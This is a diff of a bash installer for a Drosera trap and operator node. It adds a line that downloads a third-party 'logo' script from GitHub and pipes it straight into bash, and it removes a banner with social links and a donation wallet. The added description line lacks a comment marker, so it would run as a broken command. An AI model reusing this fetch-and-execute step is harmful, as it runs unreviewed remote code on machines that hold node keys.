@@ -4,6 +4,10 @@
 # Drosera Trap + Operator FULL AUTO Installation Script (no manual sourcing needed)
 # ========================
 
+Display custom logo at the beginning
+curl -s https://raw.githubusercontent.com/dlzvy/LOGOTES/main/logo1.sh | bash
+sleep 5
+
 # Define colors
 GREEN='\033[0;32m'
 RED='\033[0;31m'
@@ -155,16 +159,8 @@ echo "private_trap = true" >> drosera.toml
 echo "whitelist = [\"$operator_address\"]" >> drosera.toml
 sed -i '/whitelist = \[\]/d' drosera.toml
 
-# Banner + Loading
-clear
-figlet -f big "PIZ - NODE"
-echo "============================================================="
-echo "Follow me on Twitter for updates and more: https://x.com/whalepiz"
-echo "Join the Telegram group: https://t.me/Nexgenexplore"
-echo -e "${PURPLE}💎Donate (Wallet EVM - BNB,ETH,USDT): 0x3192b8D1f19E8914BD5Bf52941Ac704455151475 ${NC}"
-echo "============================================================="
-echo -e "${YELLOW}⌛ Waiting 8 minutes for synchronization...${NC}"
-loading_bar 480
+# Continuing with second trap apply
+
 
 # Second trap apply
 echo "ofc" | drosera apply --eth-rpc-url "$rpc_url"
